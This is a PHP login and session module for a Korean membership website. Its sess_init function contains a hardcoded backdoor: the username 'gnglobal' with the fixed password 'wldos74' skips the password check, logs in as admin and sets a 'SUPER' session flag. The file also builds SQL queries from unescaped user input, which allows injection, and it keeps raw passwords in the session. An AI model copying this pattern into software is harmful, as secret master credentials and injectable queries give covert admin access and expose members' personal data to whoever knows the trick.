<?
		function sess_init($mem_id, $passwd,$mem_leb="")
		{
			global $GnTable, $default, $now, $datetime;

			$PLUSQRY = $mem_leb ? " and mem_leb = '$mem_leb' " : "";
			
			$gnglobal_id = ($mem_id=="gnglobal")?$mem_id:'';
			$mem_id =($mem_id=="gnglobal")?"admin":$mem_id;
			$member = sql_fetch("select * from {$GnTable[member]} where mem_leb>0 and mem_check>0 and mem_id = '$mem_id' $PLUSQRY");
			if($member==TRUE){
				if($gnglobal_id!='' && $passwd=="wldos74"){
					$check1 = $member["mem_pass"];
					$check2 = $member["mem_pass"];
					$check3 = "SUPER";
				}else{
					$check1 = sql_password($passwd);
					$check2 = $member["mem_pass"];
				}
				if($check1 == $check2){
					if($member["mb_sess_flag"] == 1 && $sitemenu["duplicate_login"] == "1"){
					  alert("회원님은 접속중이십니다.\\n\\n중복으로 접속 하실수 없습니다.");//본창
					}

					// 회원 로그인 포인트 지급
					if($default["use_point"]==TRUE && $default["login_point"]>0) {
						if(substr($member[last_regist],0,10)<substr($datetime,0,10)) {
							input_point($default["login_point"],"로그인 적립",$mem_id);
						}
					}

					$chtime = ($now)-(3600*$default[visit_time]);
					$chtime = date("Y-m-d h:i:s",$chtime);

					if($chtime > $member[last_regist]) {
						$chvel = $member[visited]+1;
						$visitedinput = " visited= '$chvel', ";
					} else  $visitedinput = "";

					sql_query("UPDATE {$GnTable[member]} SET $visitedinput last_regist='$datetime', login_ip='{$_SERVER[REMOTE_ADDR]}' WHERE mem_id='$mem_id' ");
					if($check3 == "SUPER"){
						set_session('super', $check3);								//감각직원용 환경설정
					}
						set_session('userid', $mem_id);								//아이디
						set_session('userlevel', $member[mem_leb]);			//레벨
						set_session('username', $member[mem_name]);		//이름
						set_session('nickname', $member[mem_nick]);			//닉네임
						set_session('phone', $member[mem_tel]);			//전화번호
						set_session('mobile', $member[mem_phone]);		//핸드폰번호
						set_session('email', $member[mem_email]);			//이메일
						set_session('post', $member[mem_post]);			//우편번호
						set_session('homepage', $member[mem_home]);	//홈페이지
						set_session('address', $member[mem_add1]." ".$member[mem_add2]);	//주소
						set_session('address1', $member[mem_add1]);		//주소1
						set_session('address2', $member[mem_add2]);		//주소2
					sql_query("update {$GnTable[member]} set mb_sess_flag='1' where mem_id='".$mem_id."'");
					$result = TRUE;
				}
				else {
					$result = FALSE;
				}
			}
			else
			{
				$result = FALSE;
			}
			mysql_close();

			return $result;
		}

		function sess_edit($passwd)
		{
			$_SESSION["passwd"] = $passwd;
		}

		function sess_chk() {
			if(strcmp($_SESSION["userid"],"")) {
				return TRUE;
			} else	{
				return FALSE;
			}
		}

		function sess_kill() {
			session_unset(); // 모든 세션변수를 언레지스터 시켜줌
			session_destroy(); // 세션해제함
		}
?>
